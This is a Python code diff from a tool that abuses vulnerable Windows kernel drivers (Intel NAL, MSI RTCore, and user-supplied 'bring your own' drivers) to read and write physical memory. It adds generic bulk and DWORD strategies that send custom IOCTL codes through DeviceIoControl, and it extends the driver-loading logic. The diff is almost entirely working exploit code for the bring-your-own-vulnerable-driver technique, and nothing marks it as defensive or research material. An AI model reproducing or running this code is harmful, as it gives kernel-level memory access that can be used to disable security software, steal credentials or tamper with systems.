@@ -334,23 +334,83 @@ class GigabyteStrategy(IoctlStrategy):
         return bool(success)
 
 
+class GenericBulkStrategy(IoctlStrategy):
+    """Generic BYO bulk phys R/W — Intel QIQ template with custom IOCTL codes."""
+    def __init__(self, read_code: int, write_code: int):
+        self._r = read_code
+        self._w = write_code
+    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
+        if not self._r:
+            raise RuntimeError("BYO driver missing ioctl_read for bulk strategy")
+        buf = (ctypes.c_byte * size)()
+        in_buf = struct.pack("<QIQ", phys_addr, size, ctypes.addressof(buf))
+        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
+        br = wt.DWORD(0)
+        ok = k32.DeviceIoControl(handle, self._r, ctypes.byref(in_ct), len(in_buf), ctypes.byref(buf), size, ctypes.byref(br), None)
+        if not ok:
+            raise OSError(f"BYO bulk read failed at 0x{phys_addr:X} (code 0x{self._r:X})")
+        return bytes(buf)
+    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
+        if not self._w:
+            raise RuntimeError("BYO driver missing ioctl_write for bulk strategy")
+        size = len(data)
+        buf = (ctypes.c_byte * size)(*data)
+        in_buf = struct.pack("<QIQ", phys_addr, size, ctypes.addressof(buf))
+        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
+        br = wt.DWORD(0)
+        ok = k32.DeviceIoControl(handle, self._w, ctypes.byref(in_ct), len(in_buf), None, 0, ctypes.byref(br), None)
+        return bool(ok)
+
+class GenericDwordStrategy(IoctlStrategy):
+    """Generic BYO DWORD loop — MSI RTCore template with custom IOCTL codes."""
+    class Req(ctypes.Structure):
+        _fields_ = [("Pad0", ctypes.c_uint8 * 8), ("Address", ctypes.c_uint64), ("Pad1", ctypes.c_uint8 * 4), ("Offset", ctypes.c_uint32), ("Size", ctypes.c_uint32), ("Value", ctypes.c_uint32), ("Pad2", ctypes.c_uint8 * 16)]
+    def __init__(self, read_code: int, write_code: int):
+        self._r = read_code
+        self._w = write_code
+    def read_physical(self, handle: int, phys_addr: int, size: int) -> bytes:
+        if not self._r:
+            raise RuntimeError("BYO driver missing ioctl_read for dword strategy")
+        res = bytearray(); br = wt.DWORD(0)
+        for off in range(0, size, 4):
+            req = self.Req(); req.Address = phys_addr + off; req.Size = 4
+            ok = k32.DeviceIoControl(handle, self._r, ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(br), None)
+            if not ok:
+                raise OSError(f"BYO dword read failed at 0x{phys_addr+off:X}")
+            chunk = min(4, size - off)
+            res.extend(struct.pack("<I", req.Value)[:chunk])
+        return bytes(res)
+    def write_physical(self, handle: int, phys_addr: int, data: bytes) -> bool:
+        if not self._w:
+            raise RuntimeError("BYO driver missing ioctl_write for dword strategy")
+        br = wt.DWORD(0)
+        for off in range(0, len(data), 4):
+            chunk = data[off:off+4]
+            if len(chunk) < 4: chunk += b"\x00"*(4-len(chunk))
+            req = self.Req(); req.Address = phys_addr + off; req.Size = 4; req.Value = struct.unpack("<I", chunk)[0]
+            ok = k32.DeviceIoControl(handle, self._w, ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(req), ctypes.sizeof(req), ctypes.byref(br), None)
+            if not ok:
+                return False
+        return True
+
 class DriverInterface:
     """
     Polymorphic interface to vulnerable kernel drivers for physical memory access.
     """
-    def __init__(self, driver_path: Optional[str] = None):
+    def __init__(self, driver_key: Optional[str] = None, driver_path: Optional[str] = None):
         self._handle: int = 0
         self._mapper = None
         self._strategy: Optional[IoctlStrategy] = None
         self._page_table_cache: dict[int, int] = {}
-        
-        # Load via Mapper automatically
+        self._driver_key = driver_key
+
+        # Load via Mapper automatically — driver_key=None = auto-detect, or explicit BYO key
         try:
             mapper = DriverMapper()
-            if mapper.load():
+            if mapper.load(driver_key) if driver_key else mapper.load():
                 self._mapper = mapper
                 self._handle = mapper.device_handle
-                self._set_strategy(mapper.profile.driver_type)
+                self._set_strategy(mapper.profile.driver_type, mapper.profile)
                 atexit.register(self.unload)
 
             else:
@@ -358,7 +418,19 @@ class DriverInterface:
         except Exception as e:
             print(f"[DriverInterface] Error loading driver via mapper: {e}")
 
-    def _set_strategy(self, d_type):
+    def _set_strategy(self, d_type, profile=None):
+        # BYO CUSTOM — pick generic template based on byo meta
+        if d_type == DriverType.CUSTOM and profile is not None:
+            meta = getattr(profile, "_byo_meta", {}) or {}
+            strat = str(meta.get("strategy","")).lower()
+            rc = getattr(profile, "ioctl_read", 0) or 0
+            wc = getattr(profile, "ioctl_write", 0) or 0
+            if strat in ("generic_dword", "dword", "msi"):
+                self._strategy = GenericDwordStrategy(rc, wc)
+                return
+            # default bulk
+            self._strategy = GenericBulkStrategy(rc, wc)
+            return
         STRATEGY_MAP = {
             DriverType.INTEL_NAL: IntelStrategy,
             DriverType.MSI_RTCORE: MsiStrategy,
@@ -370,8 +442,12 @@ class DriverInterface:
         if cls:
             self._strategy = cls()
         else:
-            print(f"[!] No strategy for {d_type}, falling back to Intel.")
-            self._strategy = IntelStrategy()
+            # CUSTOM without profile yet — fallback generic bulk
+            if d_type == DriverType.CUSTOM:
+                self._strategy = GenericBulkStrategy(0, 0)
+            else:
+                print(f"[!] No strategy for {d_type}, falling back to Intel.")
+                self._strategy = IntelStrategy()
 
     def unload(self):
         if self._mapper and self._mapper.is_loaded:
